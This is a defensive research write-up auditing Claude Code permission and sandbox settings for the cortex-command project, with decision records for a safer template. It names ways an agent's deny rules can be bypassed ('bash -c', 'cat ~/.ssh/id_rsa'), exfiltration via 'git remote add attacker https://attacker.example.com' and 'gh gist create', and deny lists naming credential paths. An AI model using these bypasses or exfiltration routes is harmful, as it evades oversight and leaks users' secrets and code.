# Research: permissions-audit

## Research Questions

1. **How do allow/deny lists interact with the sandbox?** -> **The sandbox and permissions are complementary layers. Deny rules are evaluated first (deny -> ask -> allow) and always take precedence. The sandbox provides independent OS-level enforcement of filesystem/network restrictions. `autoAllowBashIfSandboxed: true` auto-approves sandboxed bash commands that don't match deny rules — it does NOT bypass deny rules. A command can be allowed by permissions but blocked by the sandbox at runtime.**

2. **Does `Read(~/**)` combined with deny carve-outs protect sensitive files?** -> **Partially. The deny-list-as-carve-out pattern has two weaknesses: (a) it's fragile — any sensitive path not in the deny list is readable, and (b) `Read()` deny rules only block Claude's Read tool, NOT bash subprocesses like `cat`. The sandbox's `denyOnly` list provides a second layer that blocks bash-based reads too, but only when sandbox is enabled. Defense depends on both layers being active and correctly configured.**

3. **Which allow-list entries are escape hatches?** -> **`Bash(bash *)`, `Bash(sh *)`, `Bash(source *)` allow arbitrary script execution. `Bash(python *)`, `Bash(python3 *)`, `Bash(node *)` allow arbitrary interpreter execution. `Bash(* --version)` and `Bash(* --help *)` match any command with those flags. Based on how glob pattern matching works, these likely bypass deny-list pattern matching because the deny patterns match the top-level command — e.g., `bash -c "rm -rf /"` would match `Bash(bash *)` allow, NOT `Bash(rm -rf *)` deny. CAVEAT: This bypass mechanism has not been empirically verified. Claude Code already performs semantic analysis of `&&` compound commands; it may also inspect `bash -c` arguments. This should be tested before acting on recommendations that depend on it. The sandbox mitigates filesystem/network operations regardless, but sandbox-excluded commands (git, gh, WebFetch) have no second layer.**

4. **What permissions does cortex-command actually need?** -> **See Codebase Analysis section. Important distinction: the allow/deny list only governs interactive Claude Code sessions. The overnight runner uses `--dangerously-skip-permissions` and worker agents use `permission_mode="bypassPermissions"`, bypassing the permission system entirely. Hooks are executed directly by the Claude Code harness, also outside permission evaluation. For interactive sessions, the repo needs git operations (including writes), Python module execution, specific CLI tools (jq, gh, tmux, terminal-notifier), and file operations (mkdir, ln, cp, mv). It does NOT need arbitrary bash/sh/python/node execution — all actual usage targets specific commands or Python modules.**

5. **How should permissions be layered for public distribution?** -> **Template (`claude/settings.json`) should contain safe defaults — conservative allow list, comprehensive deny list, sandbox enabled. Power-user additions (broad read access, interpreter execution, MCP permissions) go in `settings.local.json` which is already machine-specific and gitignored. The `/setup-merge` skill already supports this layering.**

6. **What are Claude Code's documented best practices?** -> **Anthropic recommends: deny rules for secrets/credentials, deny rules for destructive commands, sandbox enabled. The recommended deny list covers ~/.aws, ~/.ssh, ~/.kube, ~/.gnupg, ~/.docker, .env files, key/cert files, force-push, rm -rf, curl-pipe-bash, npm publish. The vgo project demonstrates a restrictive-allowlist approach: only build/test/read commands allowed, all git writes denied.**

7. **What sensitive paths/commands are missing from the deny list?** -> **See Missing Deny Patterns section. Key additions: `Read(~/.config/gh/hosts.yml)`, `Read(**/*.p12)`, `WebFetch(domain:0.0.0.0)`, and consideration for `git restore`, `crontab`, and plain `rm`.**

## Codebase Analysis

### Execution Context Analysis

The allow/deny permission list governs three distinct execution contexts differently:

| Context | Permission System | Sandbox | Risk Level |
|---------|------------------|---------|------------|
| **Interactive sessions** | Active — allow/deny/ask rules evaluated | Active (if enabled) | Lower — user present to review prompts |
| **Overnight orchestrator** | Bypassed — `--dangerously-skip-permissions` (runner.sh) | Active (if enabled) | Highest — multi-hour autonomous execution, no human oversight |
| **Overnight worker agents** | Bypassed — `permission_mode="bypassPermissions"` (dispatch.py) | Active (if enabled) | High — autonomous sub-tasks |
| **Hooks** (SessionStart, PreToolUse, etc.) | N/A — executed by harness directly | Depends on hook implementation | Medium — controlled scripts |

**Critical implication**: All permission-narrowing recommendations in this research (DR-1 through DR-7) only affect interactive sessions. The overnight runner — the most security-sensitive execution path — bypasses permissions entirely. For overnight execution, the sandbox is the sole security boundary. This means:
- Tightening the allow list improves interactive security but has zero effect on overnight risk
- The `--dangerously-skip-permissions` flag is a more significant security consideration than any allow-list entry, but is currently required for autonomous operation
- Sandbox configuration (especially `excludedCommands` and `denyOnly`) is the critical security surface for the overnight runner

### Actual Permission Requirements by Workflow

Note: The following lists what Claude's Bash tool invokes during interactive sessions. The overnight runner's shell script invocations (e.g., `python3 -c` in runner.sh, `source .venv/bin/activate`) are direct subprocess calls that do not pass through the permission system.

**Git operations** (skills: commit, pr, lifecycle; hooks: cleanup, scan):
- Read: `git status`, `git diff *`, `git log *`, `git show *`, `git branch *`, `git rev-parse *`, `git merge-base *`, `git ls-tree *`, `git cat-file *`, `git ls-files *`, `git describe *`, `git blame *`, `git shortlog *`, `git reflog *`, `git remote *`, `git tag *`, `git stash list *`, `git config --get *`, `git config --list *`, `git fetch *`, `git --version`
- Write: `git add *`, `git commit *`, `git push *`, `git merge *`, `git rebase *`, `git cherry-pick *`, `git checkout *`, `git switch *`, `git worktree *`, `git stash *`, `git restore *`, `git reset *`
- GPG: `GNUPGHOME=* git commit *`

**Python execution** (overnight runner, pipeline, backlog tools):
- `python3 -m claude.overnight.*` (runner modules)
- `python3 -m claude.pipeline.*` (merge, conflict resolution)
- `python3 -c "..."` (inline JSON manipulation in overnight-schedule)
- `uv run python3 -m claude.*` (via justfile recipes)

**Custom CLI tools** (deployed to ~/.local/bin/):
- `generate-backlog-index`, `update-item`, `create-backlog-item`, `validate-spec`
- `jcc` (justfile wrapper), `overnight-start`, `overnight-status`, `overnight-schedule`
- `git-sync-rebase.sh`

**Shell utilities** (hooks, scripts, recipes):
- `jq *` (JSON processing — hooks, overnight runner, settings management)
- `grep *`, `sed *`, `awk *` (text processing)
- `sort *`, `uniq *`, `cut *`, `tr *`, `comm *` (data manipulation)
- `ls *`, `cat *`, `head *`, `tail *`, `wc *`, `file *`, `stat *`, `tree *` (inspection)
- `mkdir *`, `touch *`, `cp *`, `ln *`, `mv *`, `chmod +x *` (file management)
- `realpath *`, `basename *`, `dirname *` (path operations)
- `echo *`, `pwd`, `whoami`, `which *`, `type *`, `uname *`, `hostname *`, `date *` (info)
- `diff *`, `tee *`, `less *`, `more *` (comparison/paging)
- `test *`, `[ *` (conditionals)
- `xargs *` (piping)

**External tools**:
- `gh *` (GitHub CLI — pr, issue, repo, api)
- `tmux *` (session management for overnight runner)
- `curl *` (health checks, ntfy.sh notifications)
- `terminal-notifier *` (macOS notifications — via notify hook)
- `tar *`, `zip *`, `unzip *`, `gzip *`, `gunzip *` (archives)
- `brew *` (package management for setup)
- `docker *` (optional)
- `make *` (build tool)
- `claude *` (nested Claude Code invocations)

**Setup-only tools** (not needed at runtime):
- `npm *`, `npx *`, `pip3 *`, `deno *`, `go *` (package managers/runtimes)
- `env *`, `printenv *` (environment inspection)

### Read Access Outside the Repo

Actual files read from `~/` (not within the repo):
- `~/.claude/settings.json`, `~/.claude/settings.local.json` (hook: cortex-sync-permissions.py)
- `~/.claude/hooks/*`, `~/.claude/skills/*/SKILL.md`, `~/.claude/reference/*` (all symlinked from repo)
- `~/.local/bin/*` (deployed CLI tools)
- `~/.config/claude-code-secrets/github-pat` (GitHub auth fallback)

Note: `Read(~/**)` is NOT needed for any of these — they are either symlinks to the repo, or specific paths that could be individually allowed.

### Commands NOT Actually Needed

The following are in the current allow list but have no usage in the codebase:
- `Bash(bash *)`, `Bash(sh *)`, `Bash(source *)` — no skill, hook, or script invokes arbitrary shell interpreters. The overnight runner uses `source .venv/bin/activate` but that runs in runner.sh itself, not via Claude's Bash tool.
- `Bash(python *)`, `Bash(node *)` — bare interpreter execution is not needed. Python is always invoked as `python3 -m module` or via `uv run`.
- `Bash(* --version)`, `Bash(* --help *)` — overly broad wildcards. Specific version checks (e.g., `git --version`) can be individually allowed.
- `Bash(open -na *)`, `Bash(pbcopy *)` — macOS convenience, not required for workflows
- `Bash(env *)`, `Bash(printenv *)` — environment inspection, only used during debugging

## Web & Documentation Research

### Claude Code Permission Architecture

**Evaluation order**: deny -> ask -> allow (first match wins). Deny always takes precedence.

**Settings precedence** (highest to lowest):
1. Managed settings (enterprise, cannot be overridden)
2. CLI arguments (session-only)
3. Local project settings (`.claude/settings.local.json`)
4. Shared project settings (`.claude/settings.json`)
5. User settings (`~/.claude/settings.json`)

If a tool is denied at ANY level, it cannot be allowed at a lower level.

**Pattern matching**:
- `*` is a glob wildcard matching any characters
- `Bash(bash *)` matches `bash -c "anything here"` as a glob pattern — likely dangerously broad
- Claude Code is aware of `&&` operators (compound commands get separate rules), but it is **unverified** whether `bash -c` argument inspection also occurs. Claude Code may or may not perform semantic analysis of interpreter wrapper arguments (`bash -c`, `sh -c`, `python -c`). This should be empirically tested before relying on the escape hatch argument.
- The deny list operates on pattern matching of the full command string. Whether Claude Code also performs semantic analysis of subcommands within interpreter wrappers is an open question.

**Verification needed**: Test whether `bash -c "git push --force origin main"` is blocked by the `Bash(git push --force *)` deny rule, or allowed by the `Bash(bash *)` allow rule. This determines whether the escape hatch concern in DR-2 is valid.

**Sandbox vs. permissions**:
- Permissions gate whether Claude attempts to use a tool (logic-level)
- Sandbox enforces OS-level restrictions on what bash commands can access (kernel-level)
- They are complementary: permissions can allow something the sandbox blocks, and the sandbox can block something permissions allow
- `autoAllowBashIfSandboxed: true` auto-approves non-denied commands within sandbox constraints — it does NOT bypass deny rules
- `Read()` deny rules only block Claude's Read tool — `Bash(cat <file>)` bypasses them. Sandbox `denyOnly` rules block both.

**Critical insight**: `Read(~/.ssh/**)` in the deny list prevents `Read` tool calls. But `Bash(cat ~/.ssh/id_rsa)` matches `Bash(cat *)` in the allow list, not the Read deny rule. Only the sandbox's filesystem denyOnly list blocks this bash-based bypass. This means **without sandbox, the deny list for Read is insufficient if the corresponding bash file-reading commands are allowed**.

### Anthropic Recommended Deny List

The current settings.json already includes all items from Anthropic's recommended deny list. The current list is actually more comprehensive than the recommendation.

### vgo Project Analysis

The vgo project (`jzbrooks/vgo`) demonstrates the opposite philosophy:

```json
{
  "allow": [
    "Bash(./gradlew build)", "Bash(./gradlew test)", "Bash(./gradlew check)", ...
    "Bash(grep *)", "Bash(cat *)", "Bash(ls *)", "Bash(diff *)",
    "Bash(git status*)", "Bash(git log*)", "Bash(git diff*)", "Bash(git show*)", "Bash(git branch*)"
  ],
  "deny": [
    "Bash(./gradlew clean)", "Bash(./gradlew publish*)",
    "Bash(rm *)", "Bash(git push*)", "Bash(git commit*)", "Bash(git checkout*)",
    "Bash(git reset*)", "Bash(git rebase*)",
    "Bash(find * -delete*)", "Bash(find * -exec rm*)", ...
  ]
}
```

Key differences from cortex-command:
- **No `Read(~/**)`** — no broad home-directory read access
- **No interpreter execution** — no bash/sh/python/node wildcards
- **Git writes denied** — commit, push, checkout, reset, rebase all blocked
- **All rm denied** — not just `rm -rf`, but `rm *` entirely
- **Build commands are specific** — `./gradlew build`, not `make *`

This is a **project-level** settings file (`.claude/settings.local.json`), not global settings. It represents a "Claude as read-only assistant" model. Not appropriate for cortex-command's workflow framework (which needs git writes and Python execution), but the principle of minimal allow-listing is sound.

## Domain & Prior Art

### Security Model Comparison

| Approach | Allow Philosophy | Deny Philosophy | Risk Profile |
|----------|-----------------|-----------------|-------------|
| **Cortex-command (current)** | Broad: everything useful + escape hatches | Comprehensive deny carve-outs | Fragile — depends on deny list being complete; escape hatches undermine it |
| **vgo** | Minimal: only specific build/test/read | Block writes, deletes, and mutations | Conservative — may block legitimate workflows but secure by default |
| **Recommended** | Moderate: specific commands the framework needs | Comprehensive deny + no escape hatches | Balanced — allows workflow while closing escape hatches |

### The Escape Hatch Problem

**Status: Unverified** — The bypass mechanism described below is a high-confidence inference from glob pattern matching behavior, but has not been empirically tested. If Claude Code inspects `bash -c` arguments against the deny list (as it does for `&&` chains), the severity of items 1 and 2 drops significantly.

The potential security issue with the current config:

1. `Bash(bash *)` likely allows `bash -c "any command"` — if pattern matching is purely literal, this makes the deny list bypassable at the permissions layer
2. `Bash(python3 *)` likely allows `python3 -c "import os; os.system('any command')"` — same potential problem
3. `Bash(* --version)` allows `dangerous-command --version` — matches any executable (this is confirmed: the leading `*` matches any command name)

The sandbox provides OS-level mitigation for some of this, but has significant carve-outs:
- Sandbox only restricts filesystem and network — not all dangerous operations
- `excludedCommands` includes `git:*`, `gh:*`, and `WebFetch` — these bypass the sandbox entirely
- `skipDangerousModePermissionPrompt: true` in the template reduces friction for escaping the sandbox
- If a user disables sandbox (or it's unavailable), the escape hatches are fully open

### Exfiltration Channels via Sandbox-Excluded Commands

The sandbox's `excludedCommands` create unsandboxed attack surface that the deny list does not cover:

**Git** (`git:*` excluded from sandbox, `Bash(git remote *)` and `Bash(git push *)` in allow list):
- `git remote add attacker https://attacker.example.com` + `git push attacker --all` would exfiltrate the entire repo
- `git cat-file`, `git show` can read arbitrary file contents from the repo history
- No sandbox enforcement applies to any git operation

**GitHub CLI** (`gh:*` excluded from sandbox, `Bash(gh *)` in allow list):
- `gh gist create <file>` uploads file contents to GitHub
- `gh api` can POST arbitrary data to the GitHub API
- `gh issue create --body <content>` can exfiltrate data as issue text
- No permission prompt required, no sandbox restriction

**WebFetch** (excluded from sandbox, globally allowed):
- `WebFetch` to any domain is allowed and unsandboxed
- The sandbox's `allowedDomains` only restricts bash-level network access, not WebFetch
- Only `localhost`, `127.0.0.1` (and proposed `0.0.0.0`) are denied — all other domains are accessible
- This is a broader issue than loopback: `WebFetch(domain:attacker.example.com)` is wide open

**Implication**: The defense-in-depth model (permissions + sandbox) has carve-outs aligned with the most powerful tools. For git, gh, and WebFetch, there is effectively one security layer: the permission allow/deny list alone.

### Public Distribution Concerns

When `claude/settings.json` is deployed to `~/.claude/settings.json` via `just setup`:
- It becomes the user's **global** permissions for ALL Claude Code projects
- The escape hatches apply everywhere, not just cortex-command
- A user who runs `just setup` trusts the repo's permissions model for their entire machine
- The repo's README should make this explicit, but the defaults should still be safe

## Feasibility Assessment

| Approach | Effort | Risks | Prerequisites |
|----------|--------|-------|---------------|
| **A: Trim allow list, keep split** — Remove escape hatches and `Read(~/**)` from template; document what power users should add to `settings.local.json`. Note: these changes only affect interactive sessions — overnight runner bypasses permissions entirely. | S | More permission prompts in interactive sessions until users customize settings.local.json. Limitation: settings.local.json is not version-controlled, creating config drift risk. | Clear documentation of what to add for full cortex-command functionality |
| **B: Two-tier template** — Ship a conservative `settings.json` plus an optional `settings-power.json` that users can merge | M | Maintenance of two configs; users may blindly adopt power config | `/setup-merge` skill would need to support optional power tier |
| **C: Full vgo-style lockdown** — Deny everything not specifically needed | M | Breaks cortex-command's core workflows (git writes, python execution); too restrictive for a workflow framework | Major workflow redesign to work within strict constraints |

**Recommendation: Approach A** — simplest, maintains cortex-command functionality, closes real security gaps.

## Decision Records

### DR-1: Remove `Read(~/**)`

- **Context**: `Read(~/**)` allows reading any file in the user's home directory. The deny list carves out known sensitive paths (~/.ssh, ~/.aws, etc.), but this is fragile — any new sensitive location not in the deny list is readable. This is a global setting affecting all projects.
- **Options considered**:
  1. Keep `Read(~/**)` with expanded deny list
  2. Remove `Read(~/**)` entirely (rely on project-scoped reads + sandbox)
  3. Replace with specific paths: `Read(~/.claude/**)`, `Read(~/.local/bin/*)`
- **Recommendation**: Option 2 or 3, depending on the desired balance between safety and usability (see Open Questions). Option 3 is a middle ground: explicitly allow only the paths cortex-command actually reads outside the repo.
- **Trade-offs**: Removing `Read(~/**)` only affects interactive sessions (overnight runner bypasses permissions). Owner will see permission prompts for out-of-repo reads until they customize `settings.local.json`. Note: `settings.local.json` is not version-controlled and diverges over time, which conflicts with the project's "all config in version control" philosophy.
- **Regardless of option chosen**: `Bash(cat *)` in the allow list means `cat ~/.ssh/id_rsa` bypasses the Read deny list — only the sandbox's `denyOnly` list blocks this. The shipped template does not configure sandbox `denyOnly` paths (those are set by Claude Code's own defaults, not the template).

### DR-2: Remove escape hatch commands

- **Context**: `Bash(bash *)`, `Bash(sh *)`, `Bash(source *)`, `Bash(python *)`, `Bash(python3 *)`, `Bash(node *)` allow broad interpreter execution. No skill or hook invokes `bash -c` via Claude's Bash tool (the overnight runner's shell script invocations are direct subprocesses, not tool calls). However, the escape hatch bypass mechanism is **unverified** — if Claude Code inspects `bash -c` arguments against the deny list, the security concern is lower than assumed.
- **Scope**: These changes only affect interactive sessions. The overnight runner bypasses the permission system entirely via `--dangerously-skip-permissions`. The replacement patterns like `Bash(python3 -m claude.*)` are NOT needed for overnight execution — they are convenience for interactive use only.
- **Options considered**:
  1. Keep all (status quo)
  2. Remove all six, replace with specific patterns where needed
  3. Keep `python3 *` (useful for ad-hoc work), remove the rest
- **Recommendation**: Depends on escape hatch verification and the desired safety/usability balance (see Open Questions). If the escape hatch bypass is confirmed, Option 2 is justified. If Claude Code already inspects interpreter arguments, Option 3 is sufficient. Replace patterns if removing:
  - `Bash(python3 -m claude.*)` for overnight/pipeline modules (convenience, not required)
  - `Bash(python3 -m json.tool *)` for JSON formatting
  - `Bash(uv run *)` for venv-managed execution
  - `Bash(uv sync *)` for dependency installation
  - Omit `bash *`, `sh *`, `source *`, `node *` entirely
- **Trade-offs**: More permission prompts for ad-hoc Python/Node work in interactive sessions. `settings.local.json` is not version-controlled, so power-user additions drift from the template over time.

### DR-3: Narrow wildcard patterns

- **Context**: `Bash(* --version)` matches ANY executable with `--version`. `Bash(* --help *)` matches ANY executable with `--help`. These are overly broad.
- **Options considered**:
  1. Keep wildcards (convenient for tool discovery)
  2. Remove entirely
  3. Replace with specific version checks for known tools
- **Recommendation**: Option 2 — remove both. Version/help checks happen rarely and can be prompted. The leading `*` is the issue — it matches any command name.
- **Trade-offs**: Minor inconvenience when checking tool versions.

### DR-4: Handle `git restore` and `git reset`

- **Context**: `git restore *` permanently discards uncommitted changes (no reflog recovery). `git reset *` includes both safe (`--soft`) and dangerous (`--hard`) variants. Currently both are in the allow list; only `git reset --hard*` is denied.
- **Options considered**:
  1. Move `git restore *` to deny (backlog 047 suggestion)
  2. Move to `ask` (prompt every time)
  3. Keep in allow, accept the risk
- **Recommendation**: Option 2 for `git restore`, keep `git reset` as-is (the deny for `--hard` covers the dangerous case). `git restore` is used in legitimate workflows but can destroy work — prompting is appropriate.
- **Trade-offs**: Extra prompt when Claude uses `git restore`, but this is a destructive operation that warrants confirmation.

### DR-5: Remove `skipDangerousModePermissionPrompt`

- **Context**: This setting skips the warning when entering "dangerous" (unsandboxed) mode. In the shipped template, this lowers the security bar for all adopters. This is a structural contradiction: the research's defense-in-depth argument depends on the sandbox always being active, but this setting reduces friction for disabling it.
- **Recommendation**: Remove from template. Power users can add it locally.
- **Note**: For the overnight runner, the more significant bypass is `--dangerously-skip-permissions` on the CLI, which this DR does not address (that flag is required for autonomous operation).

### DR-6: Expand deny list (backlog 047 items + new findings)

- **Context**: The deny list has known gaps identified in backlog 047 and this research.
- **Recommendation**: Add the following to the deny list:
  - `Read(~/.config/gh/hosts.yml)` — GitHub CLI auth token in plaintext
  - `Read(**/*.p12)` — certificate/key bundles (alongside .pem, .key, .pfx)
  - `WebFetch(domain:0.0.0.0)` — loopback alias bypassing localhost/127.0.0.1 deny
  - `Bash(crontab *)` — persistence mechanism that survives sessions
  - `Bash(eval *)` — arbitrary command execution via string evaluation
  - `Bash(xargs *rm*)` — deletion via xargs piping (from vgo)
  - `Bash(find * -delete*)`, `Bash(find * -exec rm*)`, `Bash(find * -exec shred*)` — bulk deletion via find (from vgo)
- **Trade-offs for plain `rm`**: The current config denies `rm -rf` and `rm -fr` but allows `rm file.txt`. This is intentional for temp file cleanup. Adding `Bash(rm *)` to deny would block routine cleanup. Recommend keeping as-is; sandbox restricts where rm can operate.

### DR-7: MCP server permissions

- **Context**: `mcp__perplexity__*`, `mcp__jetbrains__*`, `mcp__atlassian__*` are in the allow list. These are owner-specific integrations. Public adopters won't have these MCP servers configured.
- **Recommendation**: Move to `settings.local.json`. MCP permissions in the template should be empty or minimal.
- **Trade-offs**: None for public users (they don't have these servers). Owner adds them to local config.

### DR-8: Address exfiltration channels via sandbox-excluded commands

- **Context**: `git:*`, `gh:*`, and `WebFetch` are all in `excludedCommands` (bypassing sandbox) AND in the allow list. This creates exfiltration channels with effectively one security layer (permissions only). See "Exfiltration Channels via Sandbox-Excluded Commands" section above.
- **Options considered**:
  1. Narrow `gh *` to specific safe subcommands: `gh pr *`, `gh repo view *`, `gh issue view *`
  2. Move `WebFetch` to `ask` in the template (prompt before fetching arbitrary URLs)
  3. Add deny rules for known dangerous patterns: `Bash(gh gist create *)`, `Bash(git remote add *)`
  4. Remove `WebFetch` from `excludedCommands` (let sandbox restrict it)
- **Recommendation (RESOLVED)**: (a) Remove `WebFetch` from the allow list — let it fall through to prompt-based approval. Keep it in `excludedCommands` so the sandbox doesn't block it when the user approves. This means each fetch is user-reviewed in interactive sessions; overnight bypasses permissions anyway. Context7 and Perplexity MCP servers handle most research needs, so direct WebFetch is rare. (b) Narrow `gh *` to safe read patterns in the allow list. (c) Consider deny rules for `git remote add *` to prevent adding arbitrary remotes. These are meaningful security improvements because the exfiltration channels are confirmed — `excludedCommands` definitely bypasses sandbox enforcement.
- **Trade-offs**: WebFetch prompts on first use per domain in interactive sessions (low friction — most research goes through Context7/Perplexity). Narrowing `gh` means prompts for `gh gist create`, `gh pr create`, etc.

## Open Questions

- **Escape hatch verification (BLOCKER for DR-2)**: Does `bash -c "git push --force origin main"` get blocked by the `Bash(git push --force *)` deny rule, or allowed by the `Bash(bash *)` allow rule? This empirical test determines whether the escape hatch concern is valid and DR-2's severity is justified.
- **Safety vs. usability balance (RESOLVED)**: Template optimizes for public safety. Conservative defaults in the shipped template; primary user adds power-user permissions to `settings.local.json`. This means DR-1 Option 2 (remove `Read(~/**)`), DR-2 Option 2 (remove escape hatches, pending verification), and DR-7 (move MCP to local) all proceed.
- **settings.local.json as mitigation**: Multiple DRs recommend pushing removed items into `settings.local.json`. But this file is not version-controlled, diverges over time, and conflicts with the project's symlink-everything philosophy. Is there a better mechanism for the owner's power-user additions?
- Should `Bash(curl *)` be narrowed or moved to `ask`? Currently allowed, and while health checks and ntfy.sh notifications need it, broad curl access could exfiltrate data. The sandbox restricts network domains, providing mitigation.
- Should `Bash(docker *)` remain in the global template? It's not used by cortex-command core workflows. Docker operations can be powerful (mount host filesystem, access network).
- How should the `cortex-sync-permissions.py` hook be updated to work with the new split? It currently syncs permissions from settings.json to maintain consistency.
- Should `Bash(claude *)` (nested Claude invocations) remain in the template? It's used by the overnight runner but could be surprising for new adopters.
